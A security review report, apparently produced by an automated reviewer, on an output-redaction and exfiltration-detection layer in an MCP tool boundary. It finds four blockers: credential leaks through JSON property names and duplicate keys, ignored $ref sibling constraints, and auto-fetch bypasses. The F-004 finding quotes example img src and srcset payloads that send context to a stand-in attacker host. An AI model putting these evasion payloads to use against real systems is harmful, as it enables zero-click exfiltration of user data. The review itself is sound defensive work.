STATUS: DONE_WITH_CONCERNS

# T24 independent structural-output security review

## Scope

- Branch: `codex/agent-first-core`
- Parent ref: `main`
- Merge base: `0bc6418fa1a038f8ec909cf949fecba077acf9a4`
- Scope mode: explicit dispatch files plus the directly related real-SDK test
- Stage 1: **FAIL**
- Stage 2: **stopped**, as required when Stage 1 does not pass
- Source changes: none

The review covered the scripts worker's pure structural validator/detector changes and root's MCP, SDK, guard, service output-boundary, and persistence integration. The recursive scanner worker changed `src/security/service.ts` during this review: its hash moved from `2761868e…` at 12:43:26Z to `95e7786e…` at 12:47:11Z. Scanner behavior and the concurrent `types.ts`/`schemas.ts` scanner additions are excluded; the stable `validateSerializedOutput` adapter at the top of `service.ts` remains in scope and was re-executed after the change.

## Summary

- Blocker: 4
- Major: 0
- Minor: 0
- Info: 0

The focused suites pass 78/78, but their fixtures do not exercise four public-boundary evasions. Two permit direct disclosure: recognized credentials in JSON property names are never inspected, and duplicate JSON keys can hide a recognized credential from the parsed value while the adapter later restores the raw bytes. The schema adapter also accepts a value that violates a `$ref` sibling constraint, and the auto-fetch floor misses browser-decoded image URLs and `srcset`.

## Stage 1 — specification compliance

| Criterion | Verdict | Evidence |
|---|---|---|
| Tool/resource/error/SDK output contains no synthetic secret and carries safe sibling metadata without altering operation JSON | **NOT MET** | A synthetic MCP tool returned a recognized credential as a property name. `dispatchCallTool` returned `isError:false`, `redaction.state:"none"`, and the transported JSON contained the credential. Normal result/error metadata itself remained leak-safe and stayed outside operation JSON. |
| Safe numeric values/IDs retained; recognized secrets cannot bypass by field key; unsafe numeric/schema returns format-unsafe | **NOT MET** | Existing numeric/ID tests pass, and attacker-controlled schema keys/refs do not enter reason tokens. Property names are not scanned, however, and a `$ref` sibling constraint is silently ignored instead of producing format-unsafe. |
| Disabled advisory settings cannot disable the floor; persistence applies it; public links remain allowed while auto-fetch exfiltration is blocked | **NOT MET** | Normal disabled-mode and persistence tests pass, and the public-link control remains unchanged. Duplicate-key serialized JSON leaks through the persistence materializer, while entity-encoded `src` and ordinary `srcset` image URLs remain active and unchanged. |

## Findings

### [F-001] Recognized credentials in JSON property names bypass the structural floor

- **Severity:** blocker
- **File:** `src/security/output-validation.ts:240`
- **Symbol:** `sanitizeJsonValue`
- **Attack vector:** An untrusted tool or resource returns an otherwise plain object whose enumerable property name is a recognized credential. The MCP boundary copies the key without inspecting it and sends the serialized object with `isError:false` and `redaction.state:"none"`.
- **Problem:** The object walker applies `redactString` only to each property value, then copies `nestedKey` verbatim through `Object.fromEntries`. This contradicts the requirement that field placement cannot bypass a recognized secret.
- **Impact:** A credential is disclosed to the MCP client in the operation JSON. The sibling metadata falsely reports that no redaction occurred.
- **Reproduction:** Run `bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T24-stage1-probe.ts`. `secretPropertyName.leaked` and `mcpBoundary.secretPropertyNameLeaks` are `true`; the MCP result is not an error.
- **Suggested fix:** Inspect own enumerable string property descriptors before reading values. If a property name contains any redactable secret/PII span, return format-unsafe rather than renaming it and violating the object's schema. Add a direct validator regression and an MCP transport regression.
- **Class scope:** `src/security/output-validation.ts:238-246` is the only JSON object reconstruction path; `src/mcp/dispatch.ts:93-95` is the reachable tool transport adapter. The set was enumerated by reading the complete validator and searching the dispatched boundary for `Object.entries`, `Object.fromEntries`, and `validateToolOutput`.

### [F-002] Duplicate JSON keys can reintroduce a credential after safe parsed-value validation

- **Severity:** blocker
- **File:** `src/security/service.ts:38`
- **Symbol:** `validateSerializedOutput`
- **Attack vector:** Generated or tool-derived serialized JSON supplies the same benign field twice, with a recognized credential in the first value and a safe final value. `JSON.parse` discards the first value; structural validation sees only the safe value; the byte-preservation branch restores the original string, and `prepareOutputForPersistence` writes it.
- **Problem:** The serialized adapter treats validation of the parsed value as proof that every byte in the original string is safe. Duplicate members make that implication false.
- **Impact:** The mandatory floor permits a recognized credential to be persisted or returned even when the security module/advisory diagnostics are disabled.
- **Reproduction:** The T24 probe constructs duplicate-key JSON without embedding a literal credential in the artifact. It records `duplicateKeySerialized.leaked:true` and `duplicateKeyPersistence.allowed:true, leaked:true`.
- **Suggested fix:** Before returning byte-identical content, run the mandatory text detector over the original serialization and require it to remain unchanged. If the raw text changes, use a structurally safe canonical representation or return format-unsafe. Add a duplicate-member persistence regression. Apply the same rule to the exported compatibility wrapper in `mcp/redact-seam.ts`.
- **Class scope:** The parse-then-restore shape occurs at `src/security/service.ts:38-43` and `src/mcp/redact-seam.ts:16-25`; current reachable consumers of the former are `src/security/guard.ts:55`, `:111`, `:156`, and `src/security/service.ts:305`. Enumerated with `keryx ctx rg 'JSON.parse(content)|redaction.state === "none".*content|validateSerializedOutput\(' src/security src/mcp`.

### [F-003] `$ref` siblings bypass declared output-schema constraints

- **Severity:** blocker
- **File:** `src/security/schemas.ts:361`
- **Symbol:** `walk`
- **Trigger:** A tool declares a supported local `$ref` together with a supported sibling constraint such as `minLength`, then returns a value that satisfies the referenced type but violates the sibling.
- **Problem:** `screenSchema` accepts both keywords, but the existing validator resolves `$ref`, validates only the referenced schema, and immediately returns. The public boundary therefore accepts a value that its declared schema rejects under JSON Schema 2020-12 sibling semantics.
- **Impact:** Invalid operation data is transmitted with `isError:false`; the MCP client's declared output contract is silently wrong.
- **Reproduction:** The probe uses `{ $ref:"#/$defs/base", minLength:20 }` with `"short"`. Both the core and MCP results report `ok/isError` success and `redaction.state:"none"`.
- **Suggested fix:** Either evaluate supported siblings after the referenced schema, or make `screenSchema` fail closed whenever `$ref` appears with validation siblings that the underlying validator ignores. Add core and MCP regressions.
- **Class scope:** `src/security/output-validation.ts:301-313` screens references and `src/security/schemas.ts:333-364` resolves them and returns early. The complete set was enumerated with `keryx ctx rg 'schema\.\$ref|\$ref\.startsWith|resolveRef' src/security/output-validation.ts src/security/schemas.ts`.

### [F-004] Browser-decoded and `srcset` image URLs bypass auto-fetch protection

- **Severity:** blocker
- **File:** `src/security/detect/exfil.ts:29`
- **Symbol:** `detectExfil` / `exfilHost`
- **Attack vector:** Attacker-controlled output emits `<img src="https&#58;//attacker.invalid/pixel?payload=context-fragment">` or `<img srcset="https://attacker.invalid/pixel?payload=context-fragment 1x">`. An HTML renderer decodes the entity or selects the `srcset` candidate and fetches it, while the detector releases the markup unchanged.
- **Problem:** Host recognition requires the raw string to begin with `http://`, `https://`, or `//`, and the HTML matcher only recognizes `src`, not `srcset`. Detection does not canonicalize browser-decoded URL syntax before classifying the destination.
- **Impact:** Rendering a tool/resource/error string can trigger a zero-click request to an attacker host and disclose attacker-encoded context, violating the mandatory no-auto-fetch floor.
- **Reproduction:** The T24 probe records both `encodedHtmlImageChanged:false` and `srcsetHtmlImageChanged:false`; its ordinary public-link control also remains unchanged as required.
- **Suggested fix:** Parse/canonicalize HTML character references for classification while retaining original offsets for masking, and enumerate every `srcset` candidate as an auto-fetch URL. Add HTML entity, `srcset`, and Markdown entity regressions without weakening the public-link control.
- **Class scope:** All auto-fetch syntax is centralized at `src/security/detect/exfil.ts:29-43` and parser definitions `:75-83`; `srcset` has no implementation site. Enumerated with `keryx ctx rg 'exfilHost|const INLINE|REFERENCE_DEF|HTML_IMG|srcset' src/security`.

## Confirmed clean areas

- Numeric metrics, numeric IDs, booleans, nulls, and safe strings retain their types and values in the existing fixtures.
- Provider-pattern credentials in values are detected regardless of the value's field name.
- Numeric credential fields, cycles, non-finite numbers, unsupported schema keywords, invalid refs, and schema-incompatible redaction fail with constant format-unsafe text.
- Attacker-controlled schema property names and reference strings do not appear in `redaction.reasons`, error text, metadata, or fingerprints. Reasons are fixed policy/category tokens.
- Ordinary objects containing an own `undefined` value now fail format-unsafe. This differs from `JSON.stringify` omitting the member, but it is the explicitly approved T19 contract; the sampled real MCP tool suite remains green.
- Unknown tool names and resource exceptions use constant messages. Thrown tool messages are passed through the text validator, and metadata contains only the structured redaction state and safe reason tokens.
- SDK `_meta["keryx/redaction"]` remains a sibling of operation content rather than being inserted into the operation JSON. The in-memory SDK round trip passes.
- Advisory-disable paths still apply the deterministic floor for the ordinary secret fixtures, and public Markdown links remain unchanged.

## Evidence

- Exact synthetic Stage 1 probe: `T24-stage1-probe.ts`, SHA-256 `dd315537d588e70dd2b38fc791ba9acc3cabe6bae5e0bf2d6c8c541c7bf17adb`.
- Probe output: `.metaproject/data/gdctx/raw/2026-09-06T12-47-01-651Z_run.log`, SHA-256 `1ea7cbb91ecd92021fc4eeddf8423f6320535cedb7d2d51c48c158115c5d8b8e`.
- Focused existing tests: 78 passed, 0 failed, 317 assertions. Raw `.metaproject/data/gdctx/raw/2026-09-06T12-43-35-939Z_run.log`, SHA-256 `f617b0802df479543d34543ee5110b4a9f1d79be5d19f64bb158d8ddd01d656c`.
- Concurrent scanner snapshots: start `.metaproject/data/gdctx/raw/2026-09-06T12-43-26-399Z_run.log`; end `.metaproject/data/gdctx/raw/2026-09-06T12-47-11-514Z_run.log`.
- No model, network, dependency, global-test, git, flow-state, or source mutation occurred.

## Routing audit

- `graph_used: yes` — graph context and affected queries selected the boundary set; freshness reported 142 uncommitted code files, so current source and executions are authoritative.
- `wiki_used: yes` — the wiki index was read; the dispatch's approved AFC02/AFC15 specs supersede older disabled-bypass prose.
- `ctx_used: yes` — source excerpts, code searches, diff, focused tests, snapshots, and probes used gdctx.
- `raw_rg_used: no`.

```json keryx:findings
[
  {
    "id": "F-001",
    "global_id": "T24#F-001",
    "reviewer": "review-security-code",
    "severity": "blocker",
    "file": "src/security/output-validation.ts",
    "line": 240,
    "symbol": "sanitizeJsonValue",
    "problem": "The structural JSON walker scans property values but copies property names verbatim, so a recognized credential used as an enumerable key reaches MCP output with redaction.state none.",
    "impact": "An untrusted tool or resource can disclose a credential to the MCP client in operation JSON while the sibling metadata falsely reports no redaction.",
    "suggested_fix": "Inspect own enumerable string property descriptors and return format-unsafe when a property name contains a redactable secret or PII span; add direct validator and MCP transport regressions.",
    "evidence": "The offline T24 probe showed property-name leakage through both the core validator and MCP transport while MCP returned a non-error result.",
    "confidence": "high",
    "dedupe_key": "afc02:output:secret-property-name",
    "blocking_merge": true,
    "related_skill": "review-security-code",
    "learning_candidate": false,
    "class_scope": {
      "sites": [
        "src/security/output-validation.ts:238",
        "src/mcp/dispatch.ts:93"
      ],
      "enumeration_method": "Complete validator read plus ctx searches for Object.entries, Object.fromEntries, and validateToolOutput enumerated the only object reconstruction path and its public MCP adapter."
    }
  },
  {
    "id": "F-002",
    "global_id": "T24#F-002",
    "reviewer": "review-security-code",
    "severity": "blocker",
    "file": "src/security/service.ts",
    "line": 38,
    "symbol": "validateSerializedOutput",
    "problem": "The adapter validates JSON.parse(content), then restores the original bytes when the parsed value has no findings; duplicate members can hide a recognized secret in an overwritten value.",
    "impact": "A generated serialized JSON payload can persist or return a recognized credential through the mandatory floor, including when advisory security is disabled.",
    "suggested_fix": "Require the original serialized text to pass the deterministic text floor before byte-identical return, and add a duplicate-member persistence regression; apply the same rule to the exported MCP compatibility wrapper.",
    "evidence": "The offline T24 probe logged duplicateKeySerialized.leaked=true and duplicateKeyPersistence.allowed=true/leaked=true in .metaproject/data/gdctx/raw/2026-09-06T12-47-01-651Z_run.log.",
    "confidence": "high",
    "dedupe_key": "afc02:serialized-json:duplicate-key-secret",
    "blocking_merge": true,
    "related_skill": "review-security-code",
    "learning_candidate": true,
    "class_scope": {
      "sites": [
        "src/security/service.ts:38",
        "src/mcp/redact-seam.ts:16",
        "src/security/guard.ts:55",
        "src/security/guard.ts:111",
        "src/security/guard.ts:156",
        "src/security/service.ts:305"
      ],
      "enumeration_method": "ctx searches for JSON.parse(content), byte-preserving no-redaction returns, and every validateSerializedOutput call enumerated both wrappers and all current consumers."
    }
  },
  {
    "id": "F-003",
    "global_id": "T24#F-003",
    "reviewer": "review-logic",
    "severity": "blocker",
    "file": "src/security/schemas.ts",
    "line": 361,
    "symbol": "walk",
    "problem": "The output schema screen accepts a local $ref with supported validation siblings, but the underlying validator returns immediately after the reference and ignores those siblings.",
    "impact": "A tool value that violates its declared operation schema is transmitted with isError false, silently corrupting the client's output contract.",
    "suggested_fix": "Evaluate supported siblings after the referenced schema, or reject $ref plus validation siblings as unsupported until the validator implements them; add core and MCP regressions.",
    "evidence": "The offline T24 probe used a local string $ref with minLength 20 and value short; the core returned ok=true and MCP returned refSiblingIsError=false in .metaproject/data/gdctx/raw/2026-09-06T12-47-01-651Z_run.log.",
    "confidence": "high",
    "dedupe_key": "afc02:schema:ref-sibling-bypass",
    "blocking_merge": true,
    "related_skill": "review-logic",
    "learning_candidate": true,
    "class_scope": {
      "sites": [
        "src/security/output-validation.ts:301",
        "src/security/schemas.ts:333",
        "src/security/schemas.ts:361"
      ],
      "enumeration_method": "ctx search for schema.$ref, $ref.startsWith, and resolveRef across the output screen and underlying validator enumerated every reference handling site."
    }
  },
  {
    "id": "F-004",
    "global_id": "T24#F-004",
    "reviewer": "review-security-code",
    "severity": "blocker",
    "file": "src/security/detect/exfil.ts",
    "line": 29,
    "symbol": "detectExfil",
    "problem": "Auto-fetch detection classifies only raw http(s)/protocol-relative strings and only HTML src, so browser-decoded src values and srcset candidates are released unchanged.",
    "impact": "Rendering attacker-controlled tool/resource/error text can make a zero-click request to an attacker host and disclose attacker-encoded context.",
    "suggested_fix": "Canonicalize HTML character references for URL classification while preserving source offsets, enumerate srcset candidates, and add entity/srcset/Markdown entity regressions while retaining the public-link control.",
    "evidence": "The offline T24 probe logged encodedHtmlImageChanged=false and srcsetHtmlImageChanged=false; ordinaryLinkChanged also remained false in .metaproject/data/gdctx/raw/2026-09-06T12-47-01-651Z_run.log.",
    "confidence": "high",
    "dedupe_key": "afc15:exfil:html-canonicalization-srcset",
    "blocking_merge": true,
    "related_skill": "review-security-code",
    "learning_candidate": true,
    "class_scope": {
      "sites": [
        "src/security/detect/exfil.ts:29",
        "src/security/detect/exfil.ts:77",
        "src/security/detect/exfil.ts:81",
        "src/security/detect/exfil.ts:83"
      ],
      "enumeration_method": "ctx search for exfilHost, INLINE, REFERENCE_DEF, HTML_IMG, and srcset enumerated every auto-fetch parser; no srcset implementation exists."
    }
  }
]
```
